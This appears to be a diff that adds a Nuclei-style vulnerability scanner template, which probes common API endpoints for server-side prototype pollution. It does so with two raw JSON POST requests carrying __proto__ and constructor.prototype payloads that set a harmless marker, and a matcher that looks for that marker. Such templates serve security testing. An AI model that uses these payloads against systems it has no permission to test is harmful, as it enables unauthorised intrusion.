@@ -1,0 +1,55 @@
+# gap: prototype-pollution-json-body
+id: prototype-pollution-json-body
+
+info:
+  name: Server-Side Prototype Pollution via JSON Body
+  author: TyrusRC
+  severity: high
+  description: |
+    Sends a JSON POST body containing __proto__ or constructor.prototype
+    pollution payloads to common API endpoints. Frameworks using recursive
+    merge (lodash.merge, hoek, jQuery.extend) without filtering prototype
+    keys allow arbitrary code execution via prototype chain manipulation.
+  reference:
+    - https://portswigger.net/research/server-side-prototype-pollution
+    - https://cwe.mitre.org/data/definitions/1321.html
+  tags: custom,prototype-pollution,injection,nodejs,express,json
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"__proto__":{"nucleiPolluted":"true"},"test":"value"}
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"constructor":{"prototype":{"nucleiPolluted":"true"}},"test":"value"}
+    payloads:
+      path:
+        - "/"
+        - "/api"
+        - "/api/login"
+        - "/api/register"
+        - "/api/users"
+        - "/api/settings"
+        - "/api/config"
+        - "/api/v1/users"
+        - "/graphql"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "nucleiPolluted"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "__proto__"
+          - "constructor"
